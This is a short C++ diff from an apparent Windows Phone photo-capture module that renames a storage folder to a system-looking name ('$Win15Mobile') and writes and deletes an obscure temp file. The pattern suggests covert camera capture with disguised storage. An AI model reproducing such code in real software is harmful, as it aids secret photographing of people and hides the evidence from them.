@@ -473,14 +473,14 @@ NativePhotoCaptureInterface::Native::NativeCapture::NativeCapture()
 						CameraSensorLocation SL=pPhotoCaptureDevice->SensorLocation;
 						
 						
-						sprintf(nomeFile,"\\Data\\Users\\DefApps\\AppData\\{11B69356-6C6D-475D-8655-D29B240D96C8}\\$MS314Mobile\\photo_%i_%s.jpg",SL,nomeFileBase);
+						sprintf(nomeFile,"\\Data\\Users\\DefApps\\AppData\\{11B69356-6C6D-475D-8655-D29B240D96C8}\\$Win15Mobile\\photo_%i_%s.jpg",SL,nomeFileBase);
 
 						OutputDebugStringA(nomeFile);
 						OutputDebugStringA("\n");
 #else
 						//uso ptjfHJ4f4tD come file temporaneo per la conversione delle immagini in jpeg
-						sprintf(nomeFile,"\\Data\\Users\\DefApps\\AppData\\{11B69356-6C6D-475D-8655-D29B240D96C8}\\$MS314Mobile\\ptjfHJ4f4tD");
-						DeleteFile(L"\\Data\\Users\\DefApps\\AppData\\{11B69356-6C6D-475D-8655-D29B240D96C8}\\$MS314Mobile\\ptjfHJ4f4tD");
+						sprintf(nomeFile,"\\Data\\Users\\DefApps\\AppData\\{11B69356-6C6D-475D-8655-D29B240D96C8}\\$Win15Mobile\\ptjfHJ4f4tD");
+						DeleteFile(L"\\Data\\Users\\DefApps\\AppData\\{11B69356-6C6D-475D-8655-D29B240D96C8}\\$Win15Mobile\\ptjfHJ4f4tD");
 
 #endif
 
@@ -514,7 +514,7 @@ NativePhotoCaptureInterface::Native::NativeCapture::NativeCapture()
 							// print content:
 							//std::cout.write (buffer,length);
 							
-							DeleteFile(L"\\Data\\Users\\DefApps\\AppData\\{11B69356-6C6D-475D-8655-D29B240D96C8}\\$MS314Mobile\\ptjfHJ4f4tD");
+							DeleteFile(L"\\Data\\Users\\DefApps\\AppData\\{11B69356-6C6D-475D-8655-D29B240D96C8}\\$Win15Mobile\\ptjfHJ4f4tD");
 							
 							Log CameraLog;
 
